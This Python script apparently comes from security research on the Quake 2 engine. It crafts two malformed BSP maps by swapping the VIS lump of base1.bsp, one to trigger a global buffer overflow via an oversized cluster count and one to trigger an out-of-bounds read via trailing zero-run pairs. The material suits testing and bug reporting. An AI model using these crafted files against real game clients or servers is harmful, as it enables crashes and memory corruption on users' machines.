#!/usr/bin/env python3
"""AE4: craft BSPs that drive the Mod_DecompressVis (src/files/pvs.c)
edges, staged through the AE9 batched-host fallback.

Bug A (row overflow): Mod_LoadVisibility validates numclusters only
against the lump length (Z5c), not against MAX_MAP_LEAFS.  A VIS lump
big enough to hold the cluster table (8 bytes/cluster) lets
numclusters exceed MAX_MAP_LEAFS=65536, and Mod_ClusterPVS then asks
Mod_DecompressVis to decompress row=(numclusters+7)>>3 bytes into
`decompressed[MAX_MAP_LEAFS/8]`: a global write overflow.

Bug B (early-terminating stream): the decompressor loop advances the
input until `row` decompressed bytes are produced, but a `00 00` run
writes zero bytes; a stream of `00 00` pairs at the end of the lump
makes the read walk past the lump and past the end of the hunk
allocation.  numclusters stays under MAX_MAP_LEAFS here, so the Z5c
table and bitofs checks both pass.

Both are built by appending a fresh VIS lump to shipped base1.bsp
and rewriting the header's LUMP_VISIBILITY entry; every other lump
is untouched.
"""

import os
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from genbsp import collect_maps, LUMP_NAMES

LUMP_VIS = LUMP_NAMES.index("visibility")
DVIS_PVS = 0
DVIS_PAS = 1


def relump(maps, name, vis_payload):
    """Return base1 bytes with the VISIBILITY lump replaced by
    vis_payload, appended at the end of the file."""
    data = bytearray(maps[name])
    oldofs, oldlen = struct.unpack_from("<II", data, 8 + LUMP_VIS * 8)
    # Keep everything else: keep the old bytes (now dangling) and
    # point the lump entry at the appended payload instead.  Old
    # lumps may overlap the old vis region but nothing else reads it.
    newofs = len(data)
    data += vis_payload
    struct.pack_into("<II", data, 8 + LUMP_VIS * 8, newofs, len(vis_payload))
    return bytes(data), oldofs, oldlen


def build_bigvis(maps):
    # numclusters 100000 > MAX_MAP_LEAFS; row = 12500 > 8192.
    n = 100000
    table_words = 1 + 2 * n
    # literal stream: 13000 nonzero bytes, enough to fill any row
    stream_len = 13000
    payload = bytearray(4 + 8 * n)
    struct.pack_into("<i", payload, 0, n)
    bitofs = 4 + 8 * n - stream_len
    for i in range(n):
        struct.pack_into("<ii", payload, 4 + 8 * i, bitofs, bitofs)
    payload += b"\x2a" * stream_len
    assert len(payload) == 4 + 8 * n + stream_len
    return relump(maps, "base1.bsp", bytes(payload))


def build_earlyterm(maps):
    # numclusters 20000 (under the cap), bitofs at the very end of the
    # lump pointing at `00 00` pairs.
    n = 20000
    payload = bytearray(4 + 8 * n + 8)
    struct.pack_into("<i", payload, 0, n)
    bitofs = 4 + 8 * n
    for i in range(n):
        struct.pack_into("<ii", payload, 4 + 8 * i, bitofs, bitofs)
    payload += b"\x00" * 8
    return relump(maps, "base1.bsp", bytes(payload))


def main():
    out = sys.argv[1] if len(sys.argv) > 1 else "."
    maps = collect_maps("/Volumes/Scratch/dev/quake2/Quake 2.app/Contents/Resources")
    os.makedirs(out, exist_ok=True)
    for name, builder in (("cal_bigvis", build_bigvis),
            ("cal_earlyterm", build_earlyterm)):
        data, oldofs, oldlen = builder(maps)
        with open(os.path.join(out, name + ".bsp"), "wb") as f:
            f.write(data)
        print("%s: base1.bsp vis lump (%d bytes @%d) replaced, "
                "file now %d bytes" % (name, oldlen, oldofs, len(data)))
    return 0


if __name__ == "__main__":
    sys.exit(main())
